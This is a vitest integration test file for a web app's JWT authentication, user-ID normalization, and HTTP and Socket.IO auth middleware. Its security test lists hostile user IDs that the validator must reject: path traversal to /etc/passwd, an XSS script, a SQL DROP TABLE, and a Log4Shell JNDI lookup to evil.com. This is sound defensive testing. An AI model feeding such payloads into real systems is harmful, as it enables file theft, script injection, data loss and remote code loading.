import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import jwt from 'jsonwebtoken';
import JWTValidator from '../src/utils/jwtValidator.js';
import UserIdNormalizer from '../src/utils/userIdNormalizer.js';
import { authenticateSocket } from '../src/middlewares/socketAuth.js';
import auth from '../src/middlewares/auth.js';

describe('JWT Authentication Integration', () => {
  const secret = 'test-secret-key';
  let jwtValidator;

  beforeAll(() => {
    process.env.JWT_SECRET = secret;
    jwtValidator = new JWTValidator();
  });

  afterAll(() => {
    delete process.env.JWT_SECRET;
  });

  describe('JWT Validator Integration', () => {
    it('should create JWT validator instance', () => {
      expect(jwtValidator).toBeDefined();
      expect(jwtValidator.secret).toBe(secret);
    });

    it('should normalize user IDs consistently', () => {
      const tokenData = { id: '123', username: 'test' };
      const dbData = { user_id: '123', username: 'test' };
      const requestData = { userId: '123', username: 'test' };

      const tokenUserId = UserIdNormalizer.normalizeFromToken(tokenData);
      const dbUserId = UserIdNormalizer.normalizeFromDatabase(dbData);
      const requestUserId = UserIdNormalizer.normalizeFromRequest(requestData);

      expect(tokenUserId).toBe('123');
      expect(dbUserId).toBe('123');
      expect(requestUserId).toBe('123');

      // Verify consistency
      expect(UserIdNormalizer.compareUserIds(tokenUserId, dbUserId)).toBe(true);
      expect(UserIdNormalizer.compareUserIds(dbUserId, requestUserId)).toBe(true);
    });

    it('should validate user ID formats', () => {
      const uuidId = '123e4567-e89b-12d3-a456-426614174000';
      const numericId = '12345';
      const alphanumericId = 'user123';
      const invalidId = 'user@#$%';

      expect(UserIdNormalizer.validateUserIdFormat(uuidId).isValid).toBe(true);
      expect(UserIdNormalizer.validateUserIdFormat(numericId).isValid).toBe(true);
      expect(UserIdNormalizer.validateUserIdFormat(alphanumericId).isValid).toBe(true);
      expect(UserIdNormalizer.validateUserIdFormat(invalidId).isValid).toBe(false);
    });

    it('should extract tokens from various sources', () => {
      // Express request
      const expressReq = {
        header: (name) => name === 'Authorization' ? 'Bearer express-token' : null
      };

      // Socket.IO handshake
      const socketHandshake = {
        handshake: {
          auth: { token: 'socket-auth-token' },
          headers: { authorization: 'Bearer socket-header-token' },
          query: { token: 'socket-query-token' }
        }
      };

      expect(jwtValidator.extractToken(expressReq)).toBe('express-token');
      expect(jwtValidator.extractToken(socketHandshake)).toBe('socket-auth-token');
    });

    it('should create authentication context', () => {
      const validatedUser = {
        userId: '123',
        username: 'testuser',
        email: 'test@example.com'
      };

      const context = jwtValidator.createAuthContext(validatedUser);

      expect(context.userId).toBe('123');
      expect(context.username).toBe('testuser');
      expect(context.email).toBe('test@example.com');
      expect(context.tokenValid).toBe(true);
      expect(context.databaseUserExists).toBe(true);
      expect(context.lastValidated).toBeDefined();
    });

    it('should validate user ID consistency', () => {
      expect(jwtValidator.validateUserIdConsistency('123', '123')).toBe(true);
      expect(jwtValidator.validateUserIdConsistency(123, '123')).toBe(true);
      expect(jwtValidator.validateUserIdConsistency('123', '456')).toBe(false);
      expect(jwtValidator.validateUserIdConsistency(null, '123')).toBe(false);
    });
  });

  describe('User ID Normalizer Integration', () => {
    it('should handle multiple sources consistently', () => {
      const sources = {
        token: { id: '123', username: 'test' },
        database: { user_id: '123', username: 'test' },
        request: { userId: '123', action: 'test' },
        socket: { userId: '123', socketId: 'socket123' }
      };

      const result = UserIdNormalizer.normalizeFromMultipleSources(sources);

      expect(result.userId).toBe('123');
      expect(result.isConsistent).toBe(true);
      expect(result.validationPassed).toBe(true);
      expect(result.hasMultipleSources).toBe(true);
    });

    it('should detect inconsistent sources', () => {
      const sources = {
        token: { id: '123', username: 'test' },
        database: { user_id: '456', username: 'test' },
        request: { userId: '789', action: 'test' }
      };

      const result = UserIdNormalizer.normalizeFromMultipleSources(sources);

      expect(result.userId).toBe('123'); // First available
      expect(result.isConsistent).toBe(false);
      expect(result.validationPassed).toBe(false);
      expect(result.hasMultipleSources).toBe(true);
    });

    it('should create normalized user data', () => {
      const userData = {
        id: '123',
        username: 'testuser',
        email: 'test@example.com'
      };

      const normalized = UserIdNormalizer.createNormalizedUserData(userData);

      expect(normalized.userId).toBe('123');
      expect(normalized.username).toBe('testuser');
      expect(normalized.email).toBe('test@example.com');
      expect(normalized._original).toEqual(userData);
    });

    it('should extract from auth contexts', () => {
      const expressContext = {
        user: { userId: '123', username: 'test' }
      };

      const socketContext = {
        userId: '456',
        socketId: 'socket123'
      };

      expect(UserIdNormalizer.extractFromAuthContext(expressContext)).toBe('123');
      expect(UserIdNormalizer.extractFromAuthContext(socketContext)).toBe('456');
    });
  });

  describe('Middleware Integration', () => {
    it('should have enhanced HTTP auth middleware', () => {
      expect(auth).toBeDefined();
      expect(typeof auth).toBe('function');
    });

    it('should have enhanced Socket auth middleware', () => {
      expect(authenticateSocket).toBeDefined();
      expect(typeof authenticateSocket).toBe('function');
    });

    it('should handle missing tokens in HTTP middleware', async () => {
      const mockReq = {
        header: () => null
      };
      let response;
      const mockRes = {
        status: (code) => ({
          json: (data) => { response = { status: code, body: data }; }
        })
      };
      const mockNext = () => {};

      await auth(mockReq, mockRes, mockNext);

      expect(response.status).toBe(401);
      expect(response.body.code).toBe('NO_TOKEN');
    });

    it('should handle missing tokens in Socket middleware', async () => {
      const mockSocket = {
        handshake: {
          auth: {},
          headers: {},
          query: {}
        }
      };
      let error;
      const mockNext = (err) => { error = err; };

      await authenticateSocket(mockSocket, mockNext);

      expect(error).toBeDefined();
      expect(error.message).toBe('Authentication token required');
      expect(error.data.code).toBe('NO_TOKEN');
    });
  });

  describe('Error Handling Integration', () => {
    it('should handle JWT validation errors consistently', () => {
      const invalidToken = 'invalid.token.here';

      // Test HTTP error handling
      expect(() => {
        try {
          jwt.verify(invalidToken, secret);
        } catch (error) {
          if (error.name === 'JsonWebTokenError') {
            throw new Error('Invalid token format');
          }
          throw error;
        }
      }).toThrow('Invalid token format');

      // Test websocket error codes
      const websocketError = new Error('Invalid token format');
      websocketError.code = 'INVALID_TOKEN';
      expect(websocketError.code).toBe('INVALID_TOKEN');

      // Test HTTP status codes
      const httpError = new Error('Invalid token format');
      httpError.status = 401;
      httpError.code = 'INVALID_TOKEN';
      expect(httpError.status).toBe(401);
      expect(httpError.code).toBe('INVALID_TOKEN');
    });

    it('should provide consistent error messages', () => {
      const errorMessages = {
        NO_TOKEN: 'Authentication token required',
        TOKEN_EXPIRED: 'Token has expired',
        USER_NOT_FOUND: 'User not found in database',
        INVALID_TOKEN: 'Invalid token format',
        INVALID_USER_ID_FORMAT: 'Invalid user ID format'
      };

      Object.entries(errorMessages).forEach(([code, message]) => {
        const error = new Error(message);
        error.code = code;
        expect(error.message).toBe(message);
        expect(error.code).toBe(code);
      });
    });
  });

  describe('Security Integration', () => {
    it('should validate token structure', () => {
      const validTokenStructure = {
        id: '123',
        username: 'testuser',
        email: 'test@example.com',
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 3600
      };

      const token = jwt.sign(validTokenStructure, secret);
      const decoded = jwt.verify(token, secret);

      expect(decoded.id).toBe('123');
      expect(decoded.username).toBe('testuser');
      expect(decoded.email).toBe('test@example.com');
    });

    it('should handle token expiration', () => {
      const expiredTokenStructure = {
        id: '123',
        username: 'testuser',
        email: 'test@example.com',
        iat: Math.floor(Date.now() / 1000) - 7200,
        exp: Math.floor(Date.now() / 1000) - 3600 // Expired 1 hour ago
      };

      const expiredToken = jwt.sign(expiredTokenStructure, secret);

      expect(() => {
        jwt.verify(expiredToken, secret);
      }).toThrow();
    });

    it('should validate user ID format security', () => {
      const maliciousIds = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com/a}',
        'user@#$%^&*()',
        ''
      ];

      maliciousIds.forEach(id => {
        const validation = UserIdNormalizer.validateUserIdFormat(id);
        expect(validation.isValid).toBe(false);
      });
    });
  });
});